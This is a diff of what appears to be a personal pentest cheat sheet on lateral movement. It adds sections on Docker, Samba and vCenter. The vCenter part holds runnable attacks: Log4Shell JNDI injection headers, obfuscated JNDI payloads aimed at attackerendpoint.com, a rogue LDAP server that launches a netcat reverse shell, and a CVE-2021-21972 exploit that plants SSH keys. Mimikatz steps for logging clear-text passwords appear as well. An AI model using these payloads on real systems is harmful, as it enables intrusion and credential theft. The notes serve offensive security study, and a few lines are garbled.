@@ -16,8 +16,15 @@ permalink: /pen/move
 * [activedirectory](#activedirectory)
 	* [custom-ssp](#custom-ssp)
 	* [sid-history](#sid-history)
+* [docker](#docker)
+	* [administration](#administration)
+	* [grype-vuln-scan-with-scan](#grype-vuln-scan-with-scan)
+	* [java-maven-applications](#java-maven-applications)
+	* [jdbc-client](#jdbc-client)
+	* [unsecure-azure-registry](#unsecure-azure-registry)
 * [rcp](#rcp)
 * [rdp](#rdp)
+* [sambacry](#sambacry)
 * [smb](#smb)
 	* [dcom](#dcom)
 	* [impacket](#impacket)
@@ -31,12 +38,17 @@ permalink: /pen/move
 		* [copy-item](#copy-item)
 	* [xcopy](#xcopy)
 * [ssh](#ssh)
+* [sso-saml](#sso-saml)
 * [vnc](#vnc)
 	* [password-spraying](#password-spraying)
 	* [test-valid-accounts-hydra](#test-valid-accounts-hydra)
 	* [screenshots-4-pwned-desktop](#screenshots-4-pwned-desktop)
 	* [stats-4-pwned-desktop](#stats-4-pwned-desktop)
 	* [file-transfer](#file-transfer)
+* [vcenter](#vcenter)
+	* [CVE-2021-44228-VCenter](#CVE-2021-44228-VCenter)
+	* [CVE-2021-44228-VCenter](#CVE-2021-44228-VCenter-1)
+	* [CVE-2021-21972-VCenter](#CVE-2021-21972-VCenter)
 * [winrm](#winrm)
 	* [service-activation](#service-activation)
 	* [client-evil-winrm](#client-evil-winrm)
@@ -52,24 +64,11 @@ permalink: /pen/move
 
 [](assets/images/pen-ta0007-discov-t1046-scan-net-svc.png)
 
-<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
-<script>$(window).load(function() {var mm = ["https://api.github.com/repos/JoelGMSec/Invoke-Transfer","https://api.github.com/repos/Z4kSec/Masky","https://api.github.com/repos/Leo4j/Invoke-SMBRemoting","https://api.github.com/repos/calebstewart/pwncat","https://api.github.com/repos/Hackplayers/evil-winrm"]; for (rep in mm) {$.ajax({type: "GET", url: mm[rep], dataType: "json", success: function(result) {$("#mm_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.pushed_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>
-
-<link href="/sortable.css" rel="stylesheet" />
-<script src="/sortable.js"></script>
-<div id="mm">
-    <table id="mm_list" class="sortable">
-      <tr><th>_repo</th><th>_last_pushed</th><th>_stars</th><th>_watch</th><th>_language</th></tr>
-    </table>
-</div>
-
 ## <a name='activedirectory'></a>activedirectory
 
 ### <a name='custom-ssp'></a>custom-ssp
 
-🔑 KEYPOINTS :
-
-- drop the dhe malicious SSP 'mimilib.dll' in C:\Windows\System32\ to log passwords in clear-text 
+- drop the dhe malicious SSP 'mimilib.dll' in C:\Windows\System32\ to log passwords in clear-textll 
 - after a reboot all credentials can be found in clear text in C:\Windows\System32\kiwissp.log
 
 ▶️ PLAY :
@@ -85,13 +84,12 @@ privilege::debug
 misc::memssp
 ```
 
-🔎️ DETECT :
+**mitigation**
 
 - Event ID 4657 - Audit creation/change of HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages
 
 ### <a name='sid-history'></a>sid-history
 
-🔑 KEYPOINTS :
 [T1134.005](https://attack.mitre.org/techniques/T1134/005/)
 
 - ensure continued access to resources from the 'former domain' (target) to the 'ObjectSid' attribute on account objects
@@ -106,9 +104,9 @@ Get-DomainGroup -Identity "Domain Admins" -Domain dollarcorp.local -Properties O
 # generate a golden / diamond ticket
 ```
 
-🔎️ DETECT :
+**detection**
 
-- [adsecurity / sean metcalf](https://adsecurity.org/?p=1772)
+- [](https://adsecurity.org/?p=1772)
 
 ```powershell
 # enumerate all users with data in the SID History attribute and flag the ones with the 'Same Domain SID History'
@@ -122,18 +120,83 @@ Get-ADUser -Filter “SIDHistory -Like ‘*'” -Properties SIDHistory | Where {
 #   4766: An attempt to add SID History to an account failed.
 ```
 
+**mitigation**
+
+
+## <a name='docker'></a>docker
+
+!! MUST TO READ :
+- [PayloadAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#summary)
+- [infosecwriteups - attacking-and-securing-docker-containers](https://infosecwriteups.com/attacking-and-securing-docker-containers-cc8c80f05b5b)
+
+### <a name='administration'></a>administration
+```
+docker system info
+ls -alps /var/lib/docker
+docker inspect | jq 
+```
+
+### <a name='grype-vuln-scan-with-scan'></a>grype-vuln-scan-with-scan
+
+```bash
+grype <image> -o template -t ~/path/to/csv.tmpl
+cut -f3 -d"," grivy_output.csv > /tmp/mycve.txt
+while read cve; do toto=`echo $cve | tr -d \"`; grep -i $toto /usr/share/exploitdb/files_exploits.csv; done < /tmp/mycve.txt
+```
+
+Here's what the csv.tmpl file might look like:
+```bash
+"Package","Version Installed","Vulnerability ID","Severity"
+```
+
+### <a name='java-maven-applications'></a>java-maven-applications 
+```
+# extract application
+jar xf app.jar
+
+# find Spring properties files
+find . -iname "*.properties"
+find -iname "*.properties" -print | xargs grep -r "://"
+find -iname "*.properties" -print | xargs grep -r "jdbc.*://"
+find -iname "*.properties" -print | xargs grep -r "postgresql://"
+```
+
+### <a name='jdbc-client'></a>jdbc-client
+```
+alias jaqy='java -Dfile.encoding=UTF-8 -Xmx256m -jar ~/jaqy-1.2.0.jar'
+jaqy
+
+# jdbc:teradata
+.protocol teradata com.teradata.jdbc.TeraDriver
+.classpath teradata lib/terajdbc4.jar
+.open -u dbc -p dbc teradata://127.0.0.1
+
+# jdbc:postgresql
+.protocol postgresql org.postgresql.driver
+.classpath postgresql lib/postgresql-42.5.3.jar
+.open -u dbc -p dbc postgresql://127.0.0.1
+```
+
+### <a name='unsecure-azure-registry'></a>unsecure-azure-registry
+```
+curl -s -k --user "USER:PASS" https://registry.azurecr.io/v2/_catalog | jq '.repositories'
+curl -s -k --user "USER:PASS" https://registry.azurecr.io/v2/<image_name>/tags/list | jq '.tags'
+podman pull --creds "USER:PASS" registry.azurecr.io/<image_name>:<tag>
+```
+
+- [https://aex.dev.azure.com/me?mkt=en-US](https://aex.dev.azure.com/me?mkt=en-US)
+
+
+
 ## <a name='rcp'></a>rcp
 
-🔑 KEYPOINTS :
 * service-port   : 
 * service-process: 
 * artifacts      : 
 
-🔑 KEYPOINTS :
 ## <a name='rdp'></a>rdp
 
-🔑 KEYPOINTS :
-* service-port   : 3389
+* service-port   : 
 * service-process: 
 * artifacts      : 
 
@@ -143,18 +206,28 @@ Get-ADUser -Filter “SIDHistory -Like ‘*'” -Properties SIDHistory | Where {
 * [Masky](https://github.com/Z4kSec/Masky) 🔥🔥🔥
 * [Remote session hijacking - hackingarticles.in](https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/)
 
+## <a name='sambacry'></a>sambacry
+
+* CVE ID : CVE-2017-7494
+* Date: 01/06/2017
+* Snort rules : [ptresearch github](https://github.com/ptresearch/AttackDetection/blob/master/CVE-2017-7494/CVE-2017-7494.rules)
+ 
+▶️ PLAY :
+![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_1.png)
+![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_2.png)
+![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_3.png)
+![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_4.png)
+
 ## <a name='smb'></a>smb
 
 
-🔑 KEYPOINTS :
-* service-port   : 445
+* service-port   : 
 * service-process: 
 * artifacts      : 
 
 
 ### <a name='dcom'></a>dcom
 
-🔑 KEYPOINTS :
 ▶️ PLAY :
 ```powershell
 # dcom shellwindows
@@ -188,13 +261,9 @@ and when the event matches Command (custom) contains any of [Document.Applicatio
 ### <a name='impacket'></a>impacket
 
 #### <a name='atexec'></a>atexec
-🔑 KEYPOINTS :
 #### <a name='dcomexec'></a>dcomexec
-🔑 KEYPOINTS :
 #### <a name='psexec'></a>psexec
-🔑 KEYPOINTS :
 #### <a name='smbexec'></a>smbexec
-🔑 KEYPOINTS :
 
 ### <a name='invoke-SMBRemoting'></a>invoke-SMBRemoting
 
@@ -212,20 +281,22 @@ and when the event matches Command (custom) contains any of [Document.Applicatio
 #### <a name='copy-item'></a>copy-item
 
 ### <a name='xcopy'></a>xcopy
-🔑 KEYPOINTS :
 https://ss64.com/nt/xcopy.html
 
 ## <a name='ssh'></a>ssh
 
-🔑 KEYPOINTS :
-* service-port   : 22
+* service-port   : 
 * service-process: 
 * artifacts      : 
 
+## <a name='sso-saml'></a>sso-saml
+
+- [forge SAML token](https://attack.mitre.org/techniques/T1606/002/)
+
+
 ## <a name='vnc'></a>vnc
 
-🔑 KEYPOINTS :
-* service-port   : 5900
+* service-port   : 
 * service-process: 
 * artifacts      : 
 
@@ -281,9 +352,86 @@ Tools to transfer files via VNC (works on Windows 10 only):
 
 * [Invoke-Transfer](https://github.com/JoelGMSec/Invoke-Transfer)
 
+## <a name='vcenter'></a>vcenter
+
+* service-port   : 
+* service-process: 
+* artifacts      : 
+
+### <a name='CVE-2021-44228-VCenter'></a>CVE-2021-44228-VCenter
+
+```bash
+# install
+git clone https://github.com/veracode-research/rogue-jndi.git
+apt install default-jdk
+apt install java-common
+apt install java-package
+
+# check if Vcenter version is vulnerable
+curl -ski https://1.2.3.4/ui/login | grep Location
+
+# tmux windows 0 splitting
+Ctrl-b %
+Ctrl-b ->
+Ctrl-b "
+
+## cmds to run consequently in tmux windows 1, 2 and 3 
+
+# HOOK STEP 1: rogue CURL query that hook VCenter to make an LDAP query 
+curl --insecure  -vv -H "X-Forwarded-For: \${jndi:ldap://1.1.1.1:1389/o=tomcat}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="
+
+# HOOK STEP 2: run a rogue LDAP server that hook VCenter, executing netcat back to us 
+sudo java -jar target/RogueJndi-1.1.jar --command "nc -e /bin/bash 1.1.1.1 4242" --hostname "1.1.1.1"
+
+# CHECK: 1/ the LDAP, and 2/ the netcat, hooks come back
+sudo tcpdump -ni eth0 host 1.2.3.4
+
+# tmux windows 1 splitting
+Ctrl-b c
+Ctrl-b %
+Ctrl-b ->
+Ctrl-b "
+
+# REVERSE SHELL: 
+nc -lvnp 4242
+```
+
+### <a name='CVE-2021-44228-VCenter-1'></a>CVE-2021-44228-VCenter
+```bash
+# install
+
+# HOOK STEP 1: rogue CURL query that hook VCenter to make an LDAP query 
+curl --insecure  -vv -H "X-Forwarded-For: \${jndi:ldap://1.1.1.1:1389/o=tomcat}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="
+
+curl --insecure  -vv -H "X-Forwarded-For: \${\${env:ENV_NAME:-j}ndi\${env:ENV_NAME:-:}\${env:ENV_NAME:-l}dap\${env:ENV_NAME:-:}//1.1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="
+
+curl --insecure  -vv -H "X-Forwarded-For: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://1.1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="
+
+curl --insecure  -vv -H "X-Forwarded-For: \${\${lower:j}ndi:\${lower:l}\${lower:d}a\${lower:p}://1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="
+
+${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
+${${::-j}ndi:rmi://attackerendpoint.com/}
+```
+
+### <a name='CVE-2021-21972-VCenter'></a>CVE-2021-21972-VCenter
+```bash
+sudo python3 CVE-2021-21972.py -t 1.2.3.3 -f /root/.ssh/id_rsa.pub -p /home/vsphere-ui/.ssh/authorized_keys -o unix
+git clone https://github.com/ptoomey3/evilarc.git
+python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar home/vsphere-ui/.ssh
+python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar home/vsphere-ui/.ssh/id_rsa.pub
+python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar /home/vsphere-ui/.ssh/id_rsa.pub
+python evilarc.py -d 5 -p '/home/vsphere-ui/.ssh' -o unix -f linexpl.tar /home/vsphere-ui/.ssh/id_rsa.pub
+cd ../CVE-2021-21972/
+sudo python3 CVE-2021-21972.py -t 1.2.3.3
+python3 CVE-2021-21972.py -t 1.2.3.3
+python3 CVE-2021-21972.py -t 1.2.3.4
+```
+
 ## <a name='winrm'></a>winrm
 
-🔑 KEYPOINTS :
 * service-port   : 5985-5986
 * service-process: [winrshost.exe](https://www.ired.team/offensive-security/lateral-movement/winrs-for-lateral-movement)
 * artifacts      : [logs,mft,prefetch,usnjrnl](https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WinRS.htm)
@@ -332,13 +480,11 @@ winrs -r:myserver netdom join myserver /domain:testdomain /userd:johns /password
 
 ## <a name='wmi'></a>wmi
 
-🔑 KEYPOINTS :
 * service-port   : 135-139
 * service-process: 
 * artifacts      : 
 
 ### <a name='wmiexec'></a>wmiexec
 
-▶️ PLAY :
 ```powershell
 ```
